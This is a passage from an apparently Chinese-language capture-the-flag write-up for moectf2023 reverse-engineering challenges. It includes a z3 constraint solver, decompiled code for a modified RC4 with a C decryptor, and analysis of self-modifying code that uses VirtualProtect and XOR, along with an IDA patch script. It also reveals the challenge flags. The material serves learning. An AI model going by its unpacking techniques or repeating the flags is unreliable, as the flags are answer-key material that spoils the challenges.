class="number">384</span> * v4[<span class="number">7</span>]+ <span class="number">175</span> * v4[<span class="number">13</span>]+ <span class="number">5</span> * v4[<span class="number">14</span>]+ <span class="number">113</span> * v4[<span class="number">20</span>]+ <span class="number">19</span> * v4[<span class="number">21</span>]+ <span class="number">263</span> * v4[<span class="number">30</span>] == <span class="number">637650</span>)</span><br><span class="line">s.add(<span class="number">278</span> * v4[<span class="number">29</span>]+ <span class="number">169</span> * v4[<span class="number">28</span>]+ <span class="number">62</span> * v4[<span class="number">27</span>]+ <span class="number">119</span> * v4[<span class="number">26</span>]+ <span class="number">385</span> * v4[<span class="number">25</span>]+ <span class="number">289</span> * v4[<span class="number">24</span>]+ <span class="number">344</span> * v4[<span class="number">23</span>]+ <span class="number">45</span> * v4[<span class="number">20</span>]+ <span class="number">308</span> * v4[<span class="number">19</span>]+ <span class="number">318</span> * v4[<span class="number">18</span>]+ <span class="number">270</span> * v4[<span class="number">17</span>]+ v4[<span class="number">16</span>]+ <span class="number">323</span> * v4[<span class="number">15</span>]+ <span class="number">332</span> * v4[<span class="number">14</span>]+ <span class="number">287</span> * v4[<span class="number">11</span>]+ <span class="number">170</span> * v4[<span class="number">10</span>]+ <span class="number">163</span> * v4[<span class="number">9</span>]+ <span class="number">301</span> * v4[<span class="number">8</span>]+ <span class="number">303</span> * v4[<span class="number">7</span>]+ <span class="number">23</span> * v4[<span class="number">6</span>]+ <span class="number">327</span> * v4[<span class="number">5</span>]+ <span class="number">169</span> * v4[<span class="number">3</span>]+ <span class="number">28</span> * v4[<span class="number">0</span>]+ <span class="number">365</span> * v4[<span class="number">1</span>]+ <span class="number">15</span> * v4[<span class="number">2</span>]+ <span class="number">352</span> * v4[<span class="number">12</span>]+ <span class="number">72</span> * v4[<span class="number">13</span>]+ <span class="number">140</span> * v4[<span class="number">21</span>]+ <span class="number">65</span> * v4[<span class="number">22</span>]+ <span class="number">346</span> * v4[<span class="number">30</span>] == <span class="number">572609</span>)</span><br><span class="line">s.add(<span class="number">147</span> * v4[<span class="number">29</span>]+ <span class="number">88</span> * v4[<span class="number">28</span>]+ <span class="number">143</span> * v4[<span class="number">27</span>]+ <span class="number">237</span> * v4[<span class="number">26</span>]+ <span class="number">63</span> * v4[<span class="number">24</span>]+ <span class="number">281</span> * v4[<span class="number">22</span>]+ <span class="number">388</span> * v4[<span class="number">21</span>]+ <span class="number">142</span> * v4[<span class="number">20</span>]+ <span class="number">208</span> * v4[<span class="number">19</span>]+ <span class="number">60</span> * v4[<span class="number">18</span>]+ <span class="number">354</span> * v4[<span class="number">15</span>]+ <span class="number">88</span> * v4[<span class="number">14</span>]+ <span class="number">146</span> * v4[<span class="number">13</span>]+ <span class="number">290</span> * v4[<span class="number">12</span>]+ <span class="number">349</span> * v4[<span class="number">11</span>]+ <span class="number">43</span> * v4[<span class="number">10</span>]+ <span class="number">230</span> * v4[<span class="number">9</span>]+ <span class="number">267</span> * v4[<span class="number">6</span>]+ <span class="number">136</span> * v4[<span class="number">5</span>]+ <span class="number">383</span> * v4[<span class="number">4</span>]+ <span class="number">35</span> * v4[<span class="number">3</span>]+ <span class="number">226</span> * v4[<span class="number">2</span>]+ <span class="number">385</span> * v4[<span class="number">1</span>]+ <span class="number">238</span> * v4[<span class="number">0</span>]+ <span class="number">348</span> * v4[<span class="number">7</span>]+ <span class="number">20</span> * v4[<span class="number">8</span>]+ <span class="number">158</span> * v4[<span class="number">16</span>]+ <span class="number">21</span> * v4[<span class="number">17</span>]+ <span class="number">249</span> * v4[<span class="number">23</span>]+ <span class="number">9</span> * v4[<span class="number">25</span>]+ <span class="number">343</span> * v4[<span class="number">30</span>] == <span class="number">603481</span>)</span><br><span class="line">s.add(<span class="number">29</span> * v4[<span class="number">29</span>]+ <span class="number">323</span> * v4[<span class="number">26</span>]+ <span class="number">159</span> * v4[<span class="number">25</span>]+ <span class="number">118</span> * v4[<span class="number">20</span>]+ <span class="number">326</span> * v4[<span class="number">19</span>]+ <span class="number">211</span> * v4[<span class="number">18</span>]+ <span class="number">225</span> * v4[<span class="number">17</span>]+ <span class="number">355</span> * v4[<span class="number">16</span>]+ <span class="number">201</span> * v4[<span class="number">15</span>]+ <span class="number">149</span> * v4[<span class="number">14</span>]+ <span class="number">296</span> * v4[<span class="number">13</span>]+ <span class="number">184</span> * v4[<span class="number">12</span>]+ <span class="number">315</span> * v4[<span class="number">11</span>]+ <span class="number">364</span> * v4[<span class="number">10</span>]+ <span class="number">142</span> * v4[<span class="number">9</span>]+ <span class="number">75</span> * v4[<span class="number">8</span>]+ <span class="number">313</span> * v4[<span class="number">7</span>]+ <span class="number">142</span> * v4[<span class="number">6</span>]+ <span class="number">396</span> * v4[<span class="number">5</span>]+ <span class="number">348</span> * v4[<span class="number">4</span>]+ <span class="number">272</span> * v4[<span class="number">3</span>]+ <span class="number">26</span> * v4[<span class="number">2</span>]+ <span class="number">206</span> * v4[<span class="number">1</span>]+ <span class="number">173</span> * v4[<span class="number">0</span>]+ <span class="number">155</span> * v4[<span class="number">21</span>]+ <span class="number">144</span> * v4[<span class="number">22</span>]+ <span class="number">366</span> * v4[<span class="number">23</span>]+ <span class="number">257</span> * v4[<span class="number">24</span>]+ <span class="number">148</span> * v4[<span class="number">27</span>]+ <span class="number">24</span> * v4[<span class="number">28</span>]+ <span class="number">253</span> * v4[<span class="number">30</span>] == <span class="number">664504</span>)</span><br><span class="line">s.add(<span class="number">4</span> * v4[<span class="number">29</span>]+ <span class="number">305</span> * v4[<span class="number">28</span>]+ <span class="number">226</span> * v4[<span class="number">27</span>]+ <span class="number">212</span> * v4[<span class="number">26</span>]+ <span class="number">175</span> * v4[<span class="number">25</span>]+ <span class="number">93</span> * v4[<span class="number">24</span>]+ <span class="number">165</span> * v4[<span class="number">23</span>]+ <span class="number">341</span> * v4[<span class="number">20</span>]+ <span class="number">14</span> * v4[<span class="number">19</span>]+ <span class="number">394</span> * v4[<span class="number">18</span>]+ (v4[<span class="number">17</span>] * <span class="number">2</span> ** <span class="number">8</span>)+ <span class="number">252</span> * v4[<span class="number">16</span>]+ <span class="number">336</span> * v4[<span class="number">15</span>]+ <span class="number">38</span> * v4[<span class="number">14</span>]+ <span class="number">82</span> * v4[<span class="number">13</span>]+ <span class="number">155</span> * v4[<span class="number">12</span>]+ <span class="number">215</span> * v4[<span class="number">11</span>]+ <span class="number">331</span> * v4[<span class="number">10</span>]+ <span class="number">230</span> * v4[<span class="number">9</span>]+ <span class="number">241</span> * v4[<span class="number">8</span>]+ <span class="number">225</span> * v4[<span class="number">7</span>]+ <span class="number">186</span> * v4[<span class="number">4</span>]+ <span class="number">90</span> * v4[<span class="number">3</span>]+ <span class="number">50</span> * v4[<span class="number">2</span>]+ <span class="number">62</span> * v4[<span class="number">1</span>]+ <span class="number">34</span> * v4[<span class="number">0</span>]+ <span class="number">237</span> * v4[<span class="number">5</span>]+ <span class="number">11</span> * v4[<span class="number">6</span>]+ <span class="number">336</span> * v4[<span class="number">21</span>]+ <span class="number">36</span> * v4[<span class="number">22</span>]+ <span class="number">29</span> * v4[<span class="number">30</span>] == <span class="number">473092</span>)</span><br><span class="line">s.add(<span class="number">353</span> * v4[<span class="number">29</span>]+ <span class="number">216</span> * v4[<span class="number">28</span>]+ <span class="number">252</span> * v4[<span class="number">27</span>]+ <span class="number">8</span> * v4[<span class="number">26</span>]+ <span class="number">62</span> * v4[<span class="number">25</span>]+ <span class="number">233</span> * v4[<span class="number">24</span>]+ <span class="number">254</span> * v4[<span class="number">23</span>]+ <span class="number">303</span> * v4[<span class="number">22</span>]+ <span class="number">234</span> * v4[<span class="number">21</span>]+ <span class="number">303</span> * v4[<span class="number">20</span>]+ (v4[<span class="number">19</span>] * <span class="number">2</span> ** <span class="number">8</span>)+ <span class="number">148</span> * v4[<span class="number">18</span>]+ <span class="number">324</span> * v4[<span class="number">17</span>]+ <span class="number">317</span> * v4[<span class="number">16</span>]+ <span class="number">213</span> * v4[<span class="number">15</span>]+ <span class="number">309</span> * v4[<span class="number">14</span>]+ <span class="number">28</span> * v4[<span class="number">13</span>]+ <span class="number">280</span> * v4[<span class="number">11</span>]+ <span class="number">118</span> * v4[<span class="number">10</span>]+ <span class="number">58</span> * v4[<span class="number">9</span>]+ <span class="number">50</span> * v4[<span class="number">8</span>]+ <span class="number">155</span> * v4[<span class="number">7</span>]+ <span class="number">161</span> * v4[<span class="number">6</span>]+ (v4[<span class="number">5</span>] * <span class="number">2</span> ** <span class="number">6</span>)+ <span class="number">303</span> * v4[<span class="number">4</span>]+ <span class="number">76</span> * v4[<span class="number">3</span>]+ <span class="number">43</span> * v4[<span class="number">2</span>]+ <span class="number">109</span> * v4[<span class="number">1</span>]+ <span class="number">102</span> * v4[<span class="number">0</span>]+ <span class="number">93</span> * v4[<span class="number">30</span>] == <span class="number">497492</span>)</span><br><span class="line">s.add(<span class="number">89</span> * v4[<span class="number">29</span>]+ <span class="number">148</span> * v4[<span class="number">28</span>]+ <span class="number">82</span> * v4[<span class="number">27</span>]+ <span class="number">53</span> * v4[<span class="number">26</span>]+ <span class="number">274</span> * v4[<span class="number">25</span>]+ <span class="number">220</span> * v4[<span class="number">24</span>]+ <span class="number">202</span> * v4[<span class="number">23</span>]+ <span class="number">123</span> * v4[<span class="number">22</span>]+ <span class="number">231</span> * v4[<span class="number">21</span>]+ <span class="number">169</span> * v4[<span class="number">20</span>]+ <span class="number">278</span> * v4[<span class="number">19</span>]+ <span class="number">259</span> * v4[<span class="number">18</span>]+ <span class="number">208</span> * v4[<span class="number">17</span>]+ <span class="number">219</span> * v4[<span class="number">16</span>]+ <span class="number">371</span> * v4[<span class="number">15</span>]+ <span class="number">181</span> * v4[<span class="number">12</span>]+ <span class="number">104</span> * v4[<span class="number">11</span>]+ <span class="number">392</span> * v4[<span class="number">10</span>]+ <span class="number">285</span> * v4[<span class="number">9</span>]+ <span class="number">113</span> * v4[<span class="number">8</span>]+ <span class="number">298</span> * v4[<span class="number">7</span>]+ <span class="number">389</span> * v4[<span class="number">6</span>]+ <span class="number">322</span> * v4[<span class="number">5</span>]+ <span class="number">338</span> * v4[<span class="number">4</span>]+ <span class="number">237</span> * v4[<span class="number">3</span>]+ <span class="number">234</span> * v4[<span class="number">0</span>]+ <span class="number">261</span> * v4[<span class="number">1</span>]+ <span class="number">10</span> * v4[<span class="number">2</span>]+ <span class="number">345</span> * v4[<span class="number">13</span>]+ <span class="number">3</span> * v4[<span class="number">14</span>]+ <span class="number">361</span> * v4[<span class="number">30</span>] == <span class="number">659149</span>)</span><br><span class="line">s.add(<span class="number">361</span> * v4[<span class="number">29</span>]+ <span class="number">359</span> * v4[<span class="number">28</span>]+ <span class="number">93</span> * v4[<span class="number">27</span>]+ <span class="number">315</span> * v4[<span class="number">26</span>]+ <span class="number">69</span> * v4[<span class="number">25</span>]+ <span class="number">137</span> * v4[<span class="number">24</span>]+ <span class="number">69</span> * v4[<span class="number">23</span>]+ <span class="number">58</span> * v4[<span class="number">22</span>]+ <span class="number">300</span> * v4[<span class="number">21</span>]+ <span class="number">371</span> * v4[<span class="number">20</span>]+ <span class="number">264</span> * v4[<span class="number">19</span>]+ <span class="number">317</span> * v4[<span class="number">18</span>]+ <span class="number">215</span> * v4[<span class="number">17</span>]+ <span class="number">155</span> * v4[<span class="number">16</span>]+ <span class="number">215</span> * v4[<span class="number">15</span>]+ <span class="number">330</span> * v4[<span class="number">14</span>]+ <span class="number">239</span> * v4[<span class="number">13</span>]+ <span class="number">212</span> * v4[<span class="number">12</span>]+ <span class="number">88</span> * v4[<span class="number">11</span>]+ <span class="number">82</span> * v4[<span class="number">10</span>]+ <span class="number">354</span> * v4[<span class="number">9</span>]+ <span class="number">85</span> * v4[<span class="number">8</span>]+ <span class="number">310</span> * v4[<span class="number">7</span>]+ <span class="number">84</span> * v4[<span class="number">6</span>]+ <span class="number">374</span> * v4[<span class="number">5</span>]+ <span class="number">380</span> * v4[<span class="number">4</span>]+ <span class="number">215</span> * v4[<span class="number">3</span>]+ <span class="number">351</span> * v4[<span class="number">2</span>]+ <span class="number">141</span> * v4[<span class="number">1</span>]+ <span class="number">115</span> * v4[<span class="number">0</span>]+ <span class="number">108</span> * v4[<span class="number">30</span>] == <span class="number">629123</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> v4:</span><br><span class="line">    	<span class="keyword">if</span> (<span class="built_in">str</span>(m[v]) == <span class="string">&#x27;None&#x27;</span>):<span class="keyword">continue</span></span><br><span class="line">        i = m[v]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(i))),end=<span class="string">&quot;&quot;</span>) // i是<span class="built_in">int</span> ref,需要转<span class="built_in">str</span>然后转<span class="built_in">int</span></span><br></pre></td></tr></table></figure>



<h2 id="RRRRRc4"><a href="#RRRRRc4" class="headerlink" title="RRRRRc4"></a>RRRRRc4</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1400795E0</span><span class="params">(__int64 a1, __int64 a2, __int64 inputString, <span class="type">int</span> a4, __int64 key, <span class="type">unsigned</span> <span class="type">int</span> a6)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+A4h] [rbp+84h]</span></span><br><span class="line"></span><br><span class="line">  result = sub_14007555C(&amp;unk_1401A7007);</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a1 + i) = i;</span><br><span class="line">    *(_BYTE *)(a2 + i) = *(_BYTE *)(key + i % a6);</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (*(<span class="type">unsigned</span> __int8 *)(a2 + j) + *(<span class="type">unsigned</span> __int8 *)(a1 + j) + v10) % <span class="number">256</span>;</span><br><span class="line">    v12 = *(_BYTE *)(a1 + v10);</span><br><span class="line">    *(_BYTE *)(a1 + v10) = *(_BYTE *)(a1 + j);</span><br><span class="line">    *(_BYTE *)(a1 + j) = v12;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)(j + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( a4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = (v9 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v11 = (*(<span class="type">unsigned</span> __int8 *)(a1 + v9) + v11) % <span class="number">256</span>;</span><br><span class="line">    v13 = *(_BYTE *)(a1 + v11);</span><br><span class="line">    *(_BYTE *)(a1 + v11) = *(_BYTE *)(a1 + v9);</span><br><span class="line">    *(_BYTE *)(a1 + v9) = v13;</span><br><span class="line">    *(_BYTE *)(inputString + v14++) ^= *(_BYTE *)(a1</span><br><span class="line">                                                + (*(<span class="type">unsigned</span> __int8 *)(a1 + v11) + *(<span class="type">unsigned</span> __int8 *)(a1 + v9)) % <span class="number">256</span>);</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)--a4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>初始化数组 产生一个s盒 异或上s盒 是rc4的特征，不过不是标准的rc4，所以需要跟着逻辑写一下然后解密</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a1[<span class="number">256</span>], a2[<span class="number">256</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> a3[] = &#123;</span><br><span class="line">        <span class="number">0x1B</span>, <span class="number">0x9B</span>, <span class="number">0xFB</span>, <span class="number">0x19</span>, <span class="number">0x06</span>, <span class="number">0x6A</span>, <span class="number">0xB5</span>, <span class="number">0x3B</span>, <span class="number">0x7C</span>, <span class="number">0xBA</span>, <span class="number">0x03</span>, <span class="number">0xF3</span>, <span class="number">0x91</span>, <span class="number">0xB8</span>, <span class="number">0xB6</span>,</span><br><span class="line">        <span class="number">0x3D</span>, <span class="number">0x8A</span>, <span class="number">0xC1</span>, <span class="number">0x48</span>, <span class="number">0x2E</span>, <span class="number">0x50</span>, <span class="number">0x11</span>, <span class="number">0xE7</span>, <span class="number">0xC7</span>, <span class="number">0x4F</span>, <span class="number">0xB1</span>, <span class="number">0x27</span>, <span class="number">0xCF</span>, <span class="number">0xF3</span>, <span class="number">0xAE</span>,</span><br><span class="line">        <span class="number">0x03</span>, <span class="number">0x09</span>, <span class="number">0xB2</span>, <span class="number">0x08</span>, <span class="number">0xFB</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>,<span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> a4 = <span class="number">38</span>;</span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;moectf2023&quot;</span>;</span><br><span class="line">    <span class="type">int</span> a6 = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">int</span> v9 = <span class="number">0</span>, v10 = <span class="number">0</span>, v11 = <span class="number">0</span>, v13 = <span class="number">0</span>, v14 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        a1[i] = i;</span><br><span class="line">        a2[i] = key[i % a6];</span><br><span class="line">        result = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) &#123;</span><br><span class="line">        v10 = (a2[j] + a1[j] + v10) % <span class="number">256</span>;</span><br><span class="line">        <span class="type">int</span> v12 = a1[v10];</span><br><span class="line">        a1[v10] = a1[j];</span><br><span class="line">        a1[j] = v12;</span><br><span class="line">        result = j + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (a4) &#123;</span><br><span class="line">        v9 = (v9 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        v11 = (a1[v9] + v11) % <span class="number">256</span>;</span><br><span class="line">        v13 = a1[v11];</span><br><span class="line">        a1[v11] = a1[v9];</span><br><span class="line">        a1[v9] = v13;</span><br><span class="line">        a3[v14] ^= a1[(a1[v11] + a1[v9]) % <span class="number">256</span>];</span><br><span class="line">        v14++;</span><br><span class="line">        a4--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(a3); i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, a3[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ascii解密拿到flag moectf{y0u_r3a11y_understand_rc4!!!!}</p>
<h2 id="SMC"><a href="#SMC" class="headerlink" title="SMC"></a>SMC</h2><p>Self-Modifying Code顾名思义，工作起来分三步，编译的时候将函数的字节码加密插入程序，然后用VirtualProtect修改内存的保护(text段修改成可写的)，然后运行解密函数将这个函数解密</p>
<p>查询了一下，大多数smc相关的题目有关字节码加密的操作使用异或的挺多的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main_0</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+0h] [ebp-78h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+0h] [ebp-78h]</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_401087(aPlzInputYourFl, v4);</span><br><span class="line">  sub_401023(aS, (<span class="type">char</span>)v6);</span><br><span class="line">  sub_4011E0();</span><br><span class="line">  <span class="keyword">if</span> ( sub_401050(v6) )</span><br><span class="line">    sub_401087(aGood, v5);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sub_401087(aTryAgainPlease, v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前面的是vfprint和vfscanf</p>
<p>sub_4011E0(); return了一个 sub_401550()</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> sub_401550()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> result; // eax</span><br><span class="line">  <span class="built_in">int</span> i; // [esp+4h] [ebp-1Ch]</span><br><span class="line">  DWORD flOldProtect[<span class="number">2</span>]; // [esp+18h] [ebp-8h] BYREF</span><br><span class="line"></span><br><span class="line">  flOldProtect[<span class="number">1</span>] = -<span class="number">858993460</span>;</span><br><span class="line">  flOldProtect[<span class="number">0</span>] = (DWORD)malloc(8u);</span><br><span class="line">  result = VirtualProtect((char *)&amp;loc_4014D0 - (unsigned <span class="built_in">int</span>)&amp;loc_4014D0 % <span class="number">0x1000</span>, 0x1000u, 0x80u, flOldProtect);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">122</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *((_BYTE *)&amp;loc_4014D0 + i) ^= 0x66u;</span><br><span class="line">    result = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>VirtualProtect修改了内存页的权限，可读可写可执行，并填充0xcccc初始化了，然后下面loc_4014D0 按字节异或0x66u 122次</p>
<p>使用ida中的script command把0x4014D0以及往后的121个字节处理一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4014D0</span>,<span class="number">0x40154a</span>):</span><br><span class="line">    patch_byte(i,get_wide_byte(i)^<span class="number">0x66</span>)</span><br></pre></td></tr></table></figure>

<p>出现了push ebp，下面的全是db,转成数组然后转code转function，注意第一个db的位置是4014D1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl sub_4014D1(<span class="built_in">int</span> a1, char *Str)</span><br><span class="line">&#123;</span><br><span class="line">  size_t i; // [esp+0h] [ebp-8h]</span><br><span class="line">  <span class="built_in">int</span> v4; // [esp+4h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; strlen(Str); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ((unsigned __int8)(Str[i] + <span class="number">57</span>) ^ <span class="number">0x39</span>) != (unsigned __int8)byte_40A000[i] )</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在if中是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">sub_401050</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMPOUT(<span class="number">0x4014D0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以只需要把byte_40A000[i]异或一遍0x39 -57然后转ascii就能拿到flag</p>
